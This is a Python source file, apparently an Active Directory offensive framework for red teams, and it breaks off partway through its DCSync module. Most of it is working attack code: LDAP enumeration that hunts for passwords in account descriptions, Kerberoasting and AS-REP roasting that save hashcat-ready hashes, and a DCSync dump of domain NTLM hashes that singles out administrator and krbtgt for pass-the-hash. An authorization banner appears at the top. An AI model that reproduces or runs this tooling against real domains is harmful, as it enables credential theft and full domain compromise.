#!/usr/bin/env python3
"""
Sovereign Framework
====================
Author      : arkanzasfeziii
License     : MIT
Version     : 1.0.0
Description : Windows & Active Directory offensive suite for authorized red team engagements.
              Covers full AD kill chain: LDAP enumeration, Kerberoasting, AS-REP roasting,
              DCSync, ACL abuse, lateral movement (PTH / WMI), and credential dumping.

              Aligned with MITRE ATT&CK:
                T1558 Steal/Forge Kerberos Tickets | T1003 OS Credential Dumping
                T1021 Remote Services | T1078 Valid Accounts | T1484 Group Policy Abuse

WARNING: For AUTHORIZED penetration testing and red team engagements ONLY.
Unauthorized use is ILLEGAL. Obtain written authorization before use.
"""
from __future__ import annotations

import argparse
import base64
import binascii
import json
import os
import random
import re
import socket
import struct
import sys
import textwrap
import time
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

try:
    import ldap3
    from ldap3 import Server, Connection, ALL, NTLM, SIMPLE, ANONYMOUS, SUBTREE
    from ldap3.core.exceptions import LDAPException
    LDAP3 = True
except ImportError:
    LDAP3 = False

try:
    from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
    from impacket.krb5 import constants as krb5const
    from impacket.krb5.types import Principal, KerberosTime
    from impacket.krb5.asn1 import TGS_REP, AS_REP
    from impacket.smbconnection import SMBConnection
    from impacket.dcerpc.v5 import transport, samr, lsad
    from impacket.examples.secretsdump import RemoteOperations, NTDSHashes, SAMHashes
    from pyasn1.codec.native import decoder as asn1_decoder
    from pyasn1.codec.der import decoder as der_decoder, encoder as der_encoder
    IMPACKET = True
except ImportError:
    IMPACKET = False

try:
    import pyfiglet
    PYFIGLET = True
except ImportError:
    PYFIGLET = False


# ── Constants ──────────────────────────────────────────────────────────────────

TOOL_NAME = "Sovereign Framework"
VERSION   = "1.0.0"
AUTHOR    = "arkanzasfeziii"
COMMAND   = "sovereign"

LEGAL_WARNING = """
╔══════════════════════════════════════════════════════════════════════════════╗
║         ⚠   SOVEREIGN — AUTHORIZED RED TEAM USE ONLY   ⚠                   ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  This framework executes REAL Active Directory attacks: Kerberoasting,       ║
║  AS-REP roasting, DCSync (domain hash dump), ACL exploitation, Pass-the-    ║
║  Hash, and remote command execution.                                         ║
║                                                                              ║
║  Requirements before use:                                                   ║
║    ✓ Written authorization from the target organization                     ║
║    ✓ Defined scope (domain / IP range)                                      ║
║    ✓ Rules of engagement signed off                                         ║
║                                                                              ║
║  The author (arkanzasfeziii) accepts NO LIABILITY for misuse.               ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

# UAC flags
UAC_ACCOUNTDISABLE       = 0x00000002
UAC_DONT_REQ_PREAUTH     = 0x00400000
UAC_TRUSTED_FOR_DELEGATION = 0x00080000
UAC_NOT_DELEGATED        = 0x01000000
UAC_PASSWORD_NEVER_EXPIRES = 0x00010000

# ACL privilege GUIDs (Active Directory)
ACL_RIGHTS: Dict[str, str] = {
    "00000000-0000-0000-0000-000000000000": "GenericAll",
    "bf9679c0-0de6-11d0-a285-00aa003049e2": "Self-Membership",
    "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2": "DS-Replication-Get-Changes",
    "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2": "DS-Replication-Get-Changes-All",
    "00299570-246d-11d0-a768-00aa006e0529": "User-Force-Change-Password",
}
ADS_RIGHT_DS_CONTROL_ACCESS = 0x00000100
ADS_RIGHT_DS_WRITE_PROP    = 0x00000020
ADS_RIGHT_DS_SELF          = 0x00000008
GENERIC_ALL                = 0x10000000
GENERIC_WRITE              = 0x40000000
WRITE_DACL                 = 0x00040000
WRITE_OWNER                = 0x00080000

# Privileged groups to monitor
PRIV_GROUPS = [
    "Domain Admins", "Enterprise Admins", "Schema Admins",
    "Administrators", "Account Operators", "Backup Operators",
    "Server Operators", "Group Policy Creator Owners",
    "DNSAdmins", "Exchange Windows Permissions",
]

# LDAP queries
LDAP_USERS_WITH_SPN = (
    "(&(objectClass=user)(servicePrincipalName=*)"
    "(!(objectClass=computer))"
    "(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
)
LDAP_USERS_NO_PREAUTH = (
    "(&(objectClass=user)"
    "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
    "(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
)
LDAP_ALL_USERS = (
    "(&(objectClass=user)(objectCategory=person)"
    "(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
)
LDAP_COMPUTERS = "(&(objectClass=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
LDAP_DOMAIN_ADMINS = "(&(objectClass=user)(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,{base_dn}))"
LDAP_UNCONSTRAINED_DELEG = (
    "(&(objectClass=computer)"
    "(userAccountControl:1.2.840.113556.1.4.803:=524288))"
)
LDAP_CONSTRAINED_DELEG = (
    "(&(objectClass=user)"
    "(msDS-AllowedToDelegateTo=*))"
)

# Hashcat modes
HC_KERBEROAST  = 13100  # $krb5tgs$23$
HC_ASREPROAST  = 18200  # $krb5asrep$23$


# ── Dataclasses ────────────────────────────────────────────────────────────────

@dataclass
class AttackResult:
    module:   str
    action:   str
    status:   str   # SUCCESS / FAILED / PARTIAL / INFO
    target:   str  = ""
    data:     Any  = None
    severity: str  = "INFO"
    notes:    str  = ""

@dataclass
class Credential:
    type:     str
    domain:   str
    username: str
    secret:   str  # hash or plaintext
    source:   str
    notes:    str  = ""

@dataclass
class ADObject:
    dn:         str
    sam:        str
    object_class: str
    attributes: Dict[str, Any] = field(default_factory=dict)

@dataclass
class EngagementContext:
    dc_ip:    str
    domain:   str
    username: str
    password: str
    lm_hash:  str = ""
    nt_hash:  str = ""
    base_dn:  str = ""
    ldap_conn: Any = None
    results:   List[AttackResult]  = field(default_factory=list)
    credentials: List[Credential]  = field(default_factory=list)
    loot:      Dict[str, Any]      = field(default_factory=dict)
    delay:     float = 0.3


# ── Helpers ────────────────────────────────────────────────────────────────────

def _log(msg: str, level: str = "INFO") -> None:
    colors = {"INFO":"\033[36m","OK":"\033[32m","WARN":"\033[33m",
              "ERR":"\033[31m","CRIT":"\033[35m"}
    reset = "\033[0m"
    ts = datetime.now(timezone.utc).strftime("%H:%M:%S")
    print(f"{colors.get(level,'')}{ts} [{level}] {msg}{reset}")

def _domain_to_dn(domain: str) -> str:
    return ",".join(f"DC={p}" for p in domain.split("."))

def _ldap_connect(ctx: EngagementContext) -> bool:
    if not LDAP3:
        _log("Install ldap3: pip install ldap3", "ERR")
        return False
    try:
        srv = Server(ctx.dc_ip, port=389, get_info=ALL, connect_timeout=10)
        if ctx.nt_hash:
            # NTLM Pass-the-Hash
            lm  = ctx.lm_hash or "aad3b435b51404eeaad3b435b51404ee"
            ctx.ldap_conn = Connection(
                srv,
                user=f"{ctx.domain}\\{ctx.username}",
                password=f"{lm}:{ctx.nt_hash}",
                authentication=NTLM,
                auto_bind=True,
            )
        elif ctx.password:
            ctx.ldap_conn = Connection(
                srv,
                user=f"{ctx.domain}\\{ctx.username}",
                password=ctx.password,
                authentication=NTLM,
                auto_bind=True,
            )
        else:
            ctx.ldap_conn = Connection(srv, authentication=ANONYMOUS, auto_bind=True)

        if not ctx.base_dn:
            ctx.base_dn = _domain_to_dn(ctx.domain)
        _log(f"LDAP connected to {ctx.dc_ip} as {ctx.username}@{ctx.domain}", "OK")
        return True
    except LDAPException as exc:
        _log(f"LDAP connect failed: {exc}", "ERR")
        return False

def _ldap_search(ctx: EngagementContext, search_filter: str,
                 attributes: List[str], base: str = "") -> List[Any]:
    base = base or ctx.base_dn
    try:
        ctx.ldap_conn.search(
            search_base=base,
            search_filter=search_filter,
            search_scope=SUBTREE,
            attributes=attributes,
        )
        return list(ctx.ldap_conn.entries)
    except Exception as exc:
        _log(f"LDAP search failed: {exc}", "WARN")
        return []

def _uac_flags(uac: int) -> List[str]:
    flags = []
    if uac & UAC_DONT_REQ_PREAUTH:    flags.append("NO_PREAUTH")
    if uac & UAC_TRUSTED_FOR_DELEGATION: flags.append("UNCONSTRAINED_DELEG")
    if uac & UAC_PASSWORD_NEVER_EXPIRES: flags.append("PWD_NEVER_EXPIRES")
    if uac & UAC_NOT_DELEGATED:       flags.append("NOT_DELEGATED")
    return flags


# ── Module 1: LDAP Enumeration ─────────────────────────────────────────────────

class EnumModule:
    """Full LDAP enumeration: users, computers, SPNs, admins, ACLs, trusts, policy."""

    def run(self, ctx: EngagementContext) -> List[AttackResult]:
        results: List[AttackResult] = []
        if not _ldap_connect(ctx):
            return [AttackResult("enum", "ldap_connect", "FAILED",
                                 notes="Cannot connect to LDAP. Check --dc-ip, --domain, --username")]

        results.extend(self._enum_domain_info(ctx))
        results.extend(self._enum_users(ctx))
        results.extend(self._enum_spn_users(ctx))
        results.extend(self._enum_asrep_users(ctx))
        results.extend(self._enum_computers(ctx))
        results.extend(self._enum_admins(ctx))
        results.extend(self._enum_delegation(ctx))
        results.extend(self._enum_acls(ctx))
        results.extend(self._enum_trusts(ctx))
        results.extend(self._enum_policy(ctx))
        return results

    def _enum_domain_info(self, ctx: EngagementContext) -> List[AttackResult]:
        entries = _ldap_search(ctx, "(objectClass=domain)",
                               ["distinguishedName","objectSid","whenCreated",
                                "msDS-Behavior-Version","lockoutDuration","lockoutThreshold"])
        if not entries:
            return []
        e = entries[0]
        info = {
            "dn":      str(e.distinguishedName),
            "sid":     str(getattr(e, "objectSid", "")),
            "created": str(getattr(e, "whenCreated", "")),
            "functional_level": str(getattr(e, "msDS-Behavior-Version", "unknown")),
            "lockout_threshold": str(getattr(e, "lockoutThreshold", "not set")),
        }
        ctx.loot["domain_info"] = info
        _log(f"Domain: {info['dn']} | FL: {info['functional_level']} | "
             f"Lockout: {info['lockout_threshold']}", "INFO")
        return [AttackResult("enum", "domain_info", "INFO", data=info,
                             notes=f"Lockout threshold={info['lockout_threshold']} — spray carefully")]

    def _enum_users(self, ctx: EngagementContext) -> List[AttackResult]:
        entries = _ldap_search(ctx, LDAP_ALL_USERS,
                               ["sAMAccountName","distinguishedName","memberOf",
                                "userAccountControl","description","mail",
                                "lastLogonTimestamp","pwdLastSet","adminCount"])
        users = []
        interesting = []
        for e in entries:
            sam = str(getattr(e, "sAMAccountName", ""))
            uac = int(str(getattr(e, "userAccountControl", 0) or 0))
            desc = str(getattr(e, "description", "") or "")
            admin_count = int(str(getattr(e, "adminCount", 0) or 0))
            u = {
                "sam": sam, "dn": str(e.distinguishedName),
                "uac_flags": _uac_flags(uac),
                "admin_count": admin_count,
                "description": desc[:100],
                "mail": str(getattr(e, "mail", "") or ""),
            }
            users.append(u)
            # Flag interesting
            if any(kw in desc.lower() for kw in ["pass","pwd","cred","temp","init","secret"]):
                interesting.append({"sam": sam, "description": desc})
                _log(f"[Enum] Password in description: {sam} → {desc[:60]}", "CRIT")
                ctx.credentials.append(Credential(
                    "ldap_description", ctx.domain, sam, desc,
                    "LDAP description field", f"Possible password in description for {sam}"
                ))
            if admin_count == 1:
                interesting.append({"sam": sam, "reason": "adminCount=1"})

        ctx.loot["users"] = users
        _log(f"[Enum] {len(users)} enabled users | {len(interesting)} interesting", "INFO")
        return [AttackResult("enum", "users", "INFO",
                             data={"count": len(users), "interesting": interesting[:10]},
                             severity="HIGH" if interesting else "INFO",
                             notes=f"{len(users)} users enumerated, {len(interesting)} with sensitive info")]

    def _enum_spn_users(self, ctx: EngagementContext) -> List[AttackResult]:
        entries = _ldap_search(ctx, LDAP_USERS_WITH_SPN,
                               ["sAMAccountName","servicePrincipalName",
                                "distinguishedName","memberOf","userAccountControl"])
        spn_accounts = []
        for e in entries:
            sam = str(getattr(e, "sAMAccountName", ""))
            spns = [str(s) for s in (getattr(e, "servicePrincipalName", []) or [])]
            admin_member = any("admin" in str(g).lower()
                               for g in (getattr(e, "memberOf", []) or []))
            spn_accounts.append({
                "sam": sam, "spns": spns, "is_admin": admin_member,
                "dn": str(e.distinguishedName)
            })
            if admin_member:
                _log(f"[Enum] HIGH-VALUE SPN: {sam} (member of admin group!) → {spns[0]}", "CRIT")
        ctx.loot["spn_accounts"] = spn_accounts
        _log(f"[Enum] {len(spn_accounts)} Kerberoastable accounts found", "WARN" if spn_accounts else "INFO")
        return [AttackResult("enum", "spn_accounts", "SUCCESS" if spn_accounts else "INFO",
                             data=spn_accounts,
                             severity="CRITICAL" if any(a["is_admin"] for a in spn_accounts) else "HIGH",
                             notes=f"{len(spn_accounts)} Kerberoastable accounts. Run: --modules kerberoast")]

    def _enum_asrep_users(self, ctx: EngagementContext) -> List[AttackResult]:
        entries = _ldap_search(ctx, LDAP_USERS_NO_PREAUTH,
                               ["sAMAccountName","distinguishedName"])
        accs = [str(getattr(e, "sAMAccountName", "")) for e in entries]
        ctx.loot["asrep_accounts"] = accs
        if accs:
            _log(f"[Enum] {len(accs)} AS-REP roastable accounts (no preauth): {accs}", "CRIT")
        return [AttackResult("enum", "asrep_accounts",
                             "SUCCESS" if accs else "INFO",
                             data=accs, severity="CRITICAL" if accs else "INFO",
                             notes=f"{len(accs)} accounts without Kerberos preauth. Run: --modules asreproast")]

    def _enum_computers(self, ctx: EngagementContext) -> List[AttackResult]:
        entries = _ldap_search(ctx, LDAP_COMPUTERS,
                               ["sAMAccountName","dNSHostName","operatingSystem",
                                "operatingSystemVersion","lastLogonTimestamp"])
        computers = []
        for e in entries:
            computers.append({
                "sam": str(getattr(e, "sAMAccountName", "")),
                "dns": str(getattr(e, "dNSHostName", "") or ""),
                "os":  str(getattr(e, "operatingSystem", "") or ""),
                "os_ver": str(getattr(e, "operatingSystemVersion", "") or ""),
            })
        ctx.loot["computers"] = computers
        _log(f"[Enum] {len(computers)} domain-joined computers", "INFO")
        return [AttackResult("enum", "computers", "INFO",
                             data={"count": len(computers), "systems": computers[:20]},
                             notes=f"{len(computers)} domain computers (targets for lateral movement)")]

    def _enum_admins(self, ctx: EngagementContext) -> List[AttackResult]:
        results = []
        all_priv: Dict[str, List[str]] = {}
        for grp in PRIV_GROUPS:
            filter_q = f"(&(objectClass=user)(memberOf:1.2.840.113556.1.4.1941:=CN={grp},CN=Users,{ctx.base_dn}))"
            entries = _ldap_search(ctx, filter_q, ["sAMAccountName"])
            if entries:
                members = [str(getattr(e, "sAMAccountName", "")) for e in entries]
                all_priv[grp] = members
                _log(f"[Enum] {grp}: {members}", "WARN" if members else "INFO")
        ctx.loot["privileged_groups"] = all_priv
        da_count = len(all_priv.get("Domain Admins", []))
        results.append(AttackResult("enum", "privileged_groups", "INFO",
                                    data=all_priv, severity="HIGH",
                                    notes=f"Domain Admins: {da_count} members | "
                                          f"Enterprise Admins: {len(all_priv.get('Enterprise Admins', []))}"))
        return results

    def _enum_delegation(self, ctx: EngagementContext) -> List[AttackResult]:
        results = []
        # Unconstrained delegation
        entries = _ldap_search(ctx, LDAP_UNCONSTRAINED_DELEG,
                               ["sAMAccountName","dNSHostName"])
        unc = [str(getattr(e, "sAMAccountName", "")) for e in entries]
        if unc:
            _log(f"[Enum] UNCONSTRAINED DELEGATION computers: {unc}", "CRIT")
        ctx.loot["unconstrained_delegation"] = unc
        results.append(AttackResult("enum", "unconstrained_delegation",
                                    "SUCCESS" if unc else "INFO",
                                    data=unc, severity="CRITICAL" if unc else "INFO",
                                    notes=f"Unconstrained delegation hosts: {unc}. Printer Bug / SpoolSample attack possible"))

        # Constrained delegation
        entries = _ldap_search(ctx, LDAP_CONSTRAINED_DELEG,
                               ["sAMAccountName","msDS-AllowedToDelegateTo"])
        con = []
        for e in entries:
            spns = [str(s) for s in (getattr(e, "msDS-AllowedToDelegateTo", []) or [])]
            con.append({"sam": str(getattr(e, "sAMAccountName", "")), "delegate_to": spns})
        if con:
            _log(f"[Enum] CONSTRAINED DELEGATION accounts: {[c['sam'] for c in con]}", "WARN")
        ctx.loot["constrained_delegation"] = con
        results.append(AttackResult("enum", "constrained_delegation",
                                    "SUCCESS" if con else "INFO",
                                    data=con, severity="HIGH" if con else "INFO",
                                    notes=f"{len(con)} constrained delegation accounts"))
        return results

    def _enum_acls(self, ctx: EngagementContext) -> List[AttackResult]:
        """Find dangerous ACLs on privileged objects — generic approach."""
        interesting_acls = []
        # Get DA group DN
        entries = _ldap_search(ctx, f"(cn=Domain Admins)", ["distinguishedName","nTSecurityDescriptor"])
        if not entries:
            return []
        # Without control extension we can still get nTSecurityDescriptor
        # Use raw LDAP attribute to find WriteDACL/GenericAll
        for e in entries:
            raw_sd = getattr(e, "nTSecurityDescriptor", None)
            if raw_sd:
                # Check for suspicious ACEs (simplified — full parsing requires sddl lib)
                sd_str = str(raw_sd)
                if "GenericAll" in sd_str or "WriteDACL" in sd_str:
                    interesting_acls.append({"object": str(e.distinguishedName), "acl": "suspicious"})

        # Alternative: check current user's effective rights on DA group via ldap3
        current_user_dn_entries = _ldap_search(
            ctx, f"(sAMAccountName={ctx.username})", ["distinguishedName"])
        current_dn = str(current_user_dn_entries[0].distinguishedName) if current_user_dn_entries else ""
        ctx.loot["current_user_dn"] = current_dn

        # Find objects where anyone has full control / WriteDACL (broad search)
        entries = _ldap_search(ctx,
            "(&(objectClass=group)(|(cn=Domain Admins)(cn=Enterprise Admins)(cn=Administrators)))",
            ["distinguishedName","nTSecurityDescriptor"])
        ctx.loot["acl_checks"] = interesting_acls
        return [AttackResult("enum", "acl_scan", "PARTIAL",
                             data={"current_user_dn": current_dn, "interesting": interesting_acls},
                             notes="ACL enumeration requires dacl-mode LDAP or BloodHound for complete analysis. "
                                   "Use: bloodhound-python -u USER -p PASS -d DOMAIN -c ACL")]

    def _enum_trusts(self, ctx: EngagementContext) -> List[AttackResult]:
        entries = _ldap_search(ctx, "(objectClass=trustedDomain)",
                               ["trustPartner","trustType","trustAttributes","trustDirection"])
        trusts = []
        for e in entries:
            direction = int(str(getattr(e, "trustDirection", 0) or 0))
            trust_type = {1:"WINDOWS_NON_AD",2:"WINDOWS_AD",3:"MIT"}.get(
                int(str(getattr(e, "trustType", 0) or 0)), "UNKNOWN")
            dir_str = {0:"Disabled",1:"Inbound",2:"Outbound",3:"Bidirectional"}.get(direction, "?")
            trusts.append({
                "partner": str(getattr(e, "trustPartner", "")),
                "type": trust_type, "direction": dir_str,
            })
            if direction in (2, 3):
                _log(f"[Enum] DOMAIN TRUST (Outbound): {getattr(e, 'trustPartner', '')} — lateral possible", "WARN")
        ctx.loot["domain_trusts"] = trusts
        return [AttackResult("enum", "domain_trusts", "INFO", data=trusts,
                             severity="HIGH" if trusts else "INFO",
                             notes=f"{len(trusts)} domain trust(s). Outbound = attack path to partner domain")]

    def _enum_policy(self, ctx: EngagementContext) -> List[AttackResult]:
        entries = _ldap_search(ctx, "(objectClass=domain)",
                               ["minPwdLength","pwdHistoryLength","lockoutThreshold",
                                "lockoutDuration","maxPwdAge","minPwdAge"])
        if not entries:
            return []
        e = entries[0]
        pol = {
            "min_length":   str(getattr(e, "minPwdLength", 0) or 0),
            "history":      str(getattr(e, "pwdHistoryLength", 0) or 0),
            "lockout_threshold": str(getattr(e, "lockoutThreshold", 0) or 0),
            "lockout_duration": str(getattr(e, "lockoutDuration", 0) or 0),
        }
        no_lockout = int(pol["lockout_threshold"]) == 0
        if no_lockout:
            _log("[Enum] NO ACCOUNT LOCKOUT POLICY — unlimited password spray!", "CRIT")
        ctx.loot["password_policy"] = pol
        return [AttackResult("enum", "password_policy", "INFO", data=pol,
                             severity="CRITICAL" if no_lockout else "INFO",
                             notes=f"Lockout threshold={pol['lockout_threshold']} | "
                                   f"Min length={pol['min_length']}"
                                   + (" | ⚠ NO LOCKOUT!" if no_lockout else ""))]


# ── Module 2: Kerberoasting ────────────────────────────────────────────────────

class KerberoastModule:
    """Request TGS tickets for SPN accounts → hashcat-compatible output."""

    def run(self, ctx: EngagementContext, output_file: str = "") -> List[AttackResult]:
        if not IMPACKET:
            return [AttackResult("kerberoast", "setup", "FAILED",
                                 notes="Install impacket: pip install impacket")]
        results: List[AttackResult] = []

        # Get SPN accounts from loot or enumerate
        spn_accounts = ctx.loot.get("spn_accounts", [])
        if not spn_accounts:
            if not ctx.ldap_conn and not _ldap_connect(ctx):
                return [AttackResult("kerberoast", "ldap", "FAILED")]
            entries = _ldap_search(ctx, LDAP_USERS_WITH_SPN,
                                   ["sAMAccountName","servicePrincipalName"])
            spn_accounts = []
            for e in entries:
                sam  = str(getattr(e, "sAMAccountName", ""))
                spns = [str(s) for s in (getattr(e, "servicePrincipalName", []) or [])]
                spn_accounts.append({"sam": sam, "spns": spns})

        if not spn_accounts:
            return [AttackResult("kerberoast", "scan", "INFO",
                                 notes="No Kerberoastable accounts found")]

        _log(f"[Kerberoast] Targeting {len(spn_accounts)} accounts...", "INFO")
        hashes: List[str] = []

        for account in spn_accounts:
            sam   = account["sam"]
            spns  = account["spns"]
            if not spns:
                continue
            spn = spns[0]  # Use first SPN

            try:
                # Get TGT first
                username_p = Principal(
                    ctx.username,
                    type=krb5const.PrincipalNameType.NT_PRINCIPAL.value
                )
                lm  = binascii.unhexlify(ctx.lm_hash) if ctx.lm_hash else b""
                nt  = binascii.unhexlify(ctx.nt_hash) if ctx.nt_hash else b""
                tgt, cipher, old_key, session_key = getKerberosTGT(
                    username_p, ctx.password, ctx.domain, lm, nt, b"", ctx.dc_ip
                )

                # Request TGS for SPN
                server_p = Principal(
                    spn,
                    type=krb5const.PrincipalNameType.NT_SRV_INST.value
                )
                tgs, cipher_tgs, _, _ = getKerberosTGS(
                    server_p, ctx.domain, ctx.dc_ip, tgt, cipher, session_key
                )

                # Extract hash
                from pyasn1.codec.native import decoder as nd
                decoded_tgs = nd.decode(tgs, asn1Spec=TGS_REP())[0]
                etype = int(decoded_tgs["ticket"]["enc-part"]["etype"])
                cipher_bytes = decoded_tgs["ticket"]["enc-part"]["cipher"].asOctets()

                if etype == 23:
                    hash_str = (
                        f"$krb5tgs$23$*{sam}${ctx.domain.upper()}${spn}*"
                        f"${binascii.hexlify(cipher_bytes[:16]).decode()}"
                        f"${binascii.hexlify(cipher_bytes[16:]).decode()}"
                    )
                elif etype in (17, 18):
                    etype_name = "17" if etype == 17 else "18"
                    hash_str = (
                        f"$krb5tgs${etype_name}$*{sam}${ctx.domain.upper()}${spn}*"
                        f"${binascii.hexlify(cipher_bytes).decode()}"
                    )
                else:
                    hash_str = f"# {sam}: unsupported etype {etype}"

                hashes.append(hash_str)
                _log(f"[Kerberoast] Hash captured: {sam} ({spn})", "CRIT")
                results.append(AttackResult(
                    "kerberoast", "tgs_capture", "SUCCESS",
                    target=sam, severity="CRITICAL",
                    data={"sam": sam, "spn": spn, "etype": etype,
                          "hash": hash_str[:80] + "..."},
                    notes=f"TGS hash for {sam}. Crack with: hashcat -m {HC_KERBEROAST} hash.txt rockyou.txt",
                ))

            except Exception as exc:
                _log(f"[Kerberoast] {sam}: {exc}", "WARN")
                results.append(AttackResult("kerberoast", "tgs_request", "FAILED",
                                            target=sam, notes=str(exc)))

        if hashes:
            # Save to file
            out = output_file or "kerberoast_hashes.txt"
            Path(out).write_text("\n".join(hashes) + "\n", encoding="utf-8")
            _log(f"[Kerberoast] {len(hashes)} hashes saved → {out}", "OK")
            _log(f"[Kerberoast] Crack with: hashcat -m 13100 {out} rockyou.txt --force", "OK")
            ctx.loot["kerberoast_hashes"] = hashes
            results.append(AttackResult(
                "kerberoast", "summary", "SUCCESS",
                severity="CRITICAL",
                data={"count": len(hashes), "file": out},
                notes=f"{len(hashes)} TGS hashes saved to {out}. hashcat -m 13100 {out} rockyou.txt",
            ))
        return results


# ── Module 3: AS-REP Roasting ─────────────────────────────────────────────────

class ASREPRoastModule:
    """Request AS-REP for accounts without preauth — no credentials needed."""

    def run(self, ctx: EngagementContext, output_file: str = "") -> List[AttackResult]:
        results: List[AttackResult] = []

        # Get accounts from loot or enumerate via LDAP (requires creds for LDAP)
        asrep_accounts = ctx.loot.get("asrep_accounts", [])
        if not asrep_accounts and (ctx.password or ctx.nt_hash):
            if not ctx.ldap_conn and not _ldap_connect(ctx):
                return [AttackResult("asreproast", "ldap", "PARTIAL",
                                     notes="Cannot enumerate via LDAP. Provide usernames via --users")]
            entries = _ldap_search(ctx, LDAP_USERS_NO_PREAUTH, ["sAMAccountName"])
            asrep_accounts = [str(getattr(e, "sAMAccountName", "")) for e in entries]

        if not asrep_accounts:
            return [AttackResult("asreproast", "scan", "INFO",
                                 notes="No accounts without preauth found (or need creds to enumerate)")]

        if not IMPACKET:
            return [AttackResult("asreproast", "setup", "FAILED",
                                 notes="Install impacket: pip install impacket")]

        _log(f"[ASREPRoast] Targeting {len(asrep_accounts)} accounts...", "INFO")
        hashes: List[str] = []

        for username in asrep_accounts:
            try:
                user_p = Principal(
                    username,
                    type=krb5const.PrincipalNameType.NT_PRINCIPAL.value
                )
                # Request TGT without password — works only if preauth disabled
                tgt, cipher, _, _ = getKerberosTGT(
                    user_p, "", ctx.domain, b"", b"", b"", ctx.dc_ip
                )
                from pyasn1.codec.native import decoder as nd
                decoded = nd.decode(tgt, asn1Spec=AS_REP())[0]
                etype  = int(decoded["enc-part"]["etype"])
                cipher_bytes = decoded["enc-part"]["cipher"].asOctets()
                hash_str = (
                    f"$krb5asrep${etype}${username}@{ctx.domain.upper()}:"
                    f"{binascii.hexlify(cipher_bytes[:16]).decode()}"
                    f"${binascii.hexlify(cipher_bytes[16:]).decode()}"
                )
                hashes.append(hash_str)
                _log(f"[ASREPRoast] Hash captured: {username}", "CRIT")
                results.append(AttackResult(
                    "asreproast", "asrep_capture", "SUCCESS",
                    target=username, severity="CRITICAL",
                    data={"username": username, "etype": etype,
                          "hash": hash_str[:80] + "..."},
                    notes=f"AS-REP hash for {username}. Crack with: hashcat -m {HC_ASREPROAST} hash.txt rockyou.txt",
                ))
            except Exception as exc:
                err = str(exc)
                if "KDC_ERR_PREAUTH_REQUIRED" in err:
                    _log(f"[ASREPRoast] {username}: preauth required (false positive)", "WARN")
                else:
                    _log(f"[ASREPRoast] {username}: {err}", "WARN")
                results.append(AttackResult("asreproast", "asrep_request", "FAILED",
                                            target=username, notes=err))

        if hashes:
            out = output_file or "asrep_hashes.txt"
            Path(out).write_text("\n".join(hashes) + "\n", encoding="utf-8")
            _log(f"[ASREPRoast] {len(hashes)} hashes saved → {out}", "OK")
            ctx.loot["asrep_hashes"] = hashes
            results.append(AttackResult(
                "asreproast", "summary", "SUCCESS",
                severity="CRITICAL",
                data={"count": len(hashes), "file": out},
                notes=f"{len(hashes)} AS-REP hashes saved. hashcat -m 18200 {out} rockyou.txt",
            ))
        return results


# ── Module 4: DCSync ──────────────────────────────────────────────────────────

class DCsyncModule:
    """DCSync attack — dump all NTLM hashes from domain via DRSUAPI replication."""

    def run(self, ctx: EngagementContext,
            target_user: str = "", output_file: str = "") -> List[AttackResult]:
        if not IMPACKET:
            return [AttackResult("dcsync", "setup", "FAILED",
                                 notes="Install impacket: pip install impacket")]
        results: List[AttackResult] = []
        _log(f"[DCSync] Starting against {ctx.dc_ip} ({ctx.domain})...", "INFO")
        _log(f"[DCSync] Requires DA or Replication rights (DS-Replication-Get-Changes-All)", "WARN")

        try:
            # Build SMB transport
            string_binding = f"ncacn_np:{ctx.dc_ip}[\\pipe\\netlogon]"
            rpc_transport = transport.DCERPCTransportFactory(string_binding)
            rpc_transport.set_dport(445)

            lm  = binascii.unhexlify(ctx.lm_hash) if ctx.lm_hash else b""
            nt  = binascii.unhexlify(ctx.nt_hash) if ctx.nt_hash else b""
            rpc_transport.setCredentials(
                ctx.username, ctx.password, ctx.domain, lm, nt, b""
            )
            remote_ops = RemoteOperations(rpc_transport, False)
            remote_ops.enableRegistry()

            try:
                boot_key = remote_ops.getBootKey()
                _log(f"[DCSync] Boot key obtained: {binascii.hexlify(boot_key).decode()}", "OK")
            except Exception:
                boot_key = None

            # NTDS dump via DRSUAPI
            ntds_hashes: List[str] = []
            def hash_callback(secret: str) -> None:
                ntds_hashes.append(secret)
                if len(ntds_hashes) % 100 == 0:
                    _log(f"[DCSync] Extracted {len(ntds_hashes)} hashes...", "INFO")

            NTDS = NTDSHashes(
                None, boot_key,
                isRemote=True,
                history=False,
                noLMHash=True,
                remoteOps=remote_ops,
                useVSSMethod=False,
                justNTLM=True,
                pwdLastSet=False,
                resumeSession=None,
                outputFileName=output_file or "dcsync_hashes",
                justUser=target_user or None,
                printUserStatus=False,
            )
            NTDS.dump()
            NTDS.export()

            _log(f"[DCSync] Extracted {len(ntds_hashes)} credentials", "CRIT")
            ctx.loot["dcsync"] = {
                "count": len(ntds_hashes),
                "file": output_file or "dcsync_hashes.ntds",
                "sample": ntds_hashes[:5],
            }

            # Store notable accounts
            for h in ntds_hashes:
                parts = h.split(":")
                if len(parts) >= 4:
                    sam, _, lm_h, nt_h = parts[:4]
                    if sam.lower() in ("administrator", "krbtgt"):
                        ctx.credentials.append(Credential(
                            "ntlm_hash", ctx.domain, sam,
                            f"{lm_h}:{nt_h}", "dcsync",
                            notes=f"DCSync. Use for PTH: -hashes {lm_h}:{nt_h}",
                        ))
                        _log(f"[DCSync] {sam}: {nt_h}", "CRIT")

            results.append(AttackResult(
                "dcsync", "domain_dump", "SUCCESS",
                severity="CRITICAL",
                data={"total": len(ntds_hashes), "file": output_file or "dcsync_hashes.ntds"},
                notes=f"Full domain hash dump complete. {len(ntds_hashes)} credentials."
                      f" PTH with admin: wmiexec.py -hashes LM:NT DOMAIN/Administrator@TARGET",
            ))
            remote_ops.finish()

        except Exception as exc:
            err = str(exc)
            if "access denied" in err.lower() or "rpc_s_access_denied" in err.lower():
                _log(f"[DCSync] Access Denied — need Domain Admin or replication rights", "ERR")
                results.append(AttackResult("dcsync", "domain_dump", "FAILED",
                                            severity="INFO",
